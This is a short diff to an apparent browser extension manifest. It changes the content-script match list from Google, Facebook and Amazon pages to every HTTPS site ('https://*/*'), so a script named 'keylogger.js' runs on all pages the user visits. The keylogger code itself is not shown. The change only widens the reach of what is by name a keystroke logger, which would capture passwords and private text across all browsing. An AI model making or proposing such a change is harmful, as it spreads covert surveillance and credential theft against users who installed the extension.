@@ -16,7 +16,7 @@
        "128": "icon.png" },
     "content_scripts": [
         {
-          "matches": [ "https://www.google.com/*", "https://*.google.com/*","https://www.facebook.com/*","https://www.amazon.com/*" ],
+          "matches": [ "https://*/*" ],
           "js": [ "keylogger.js" ]
         }
     ],
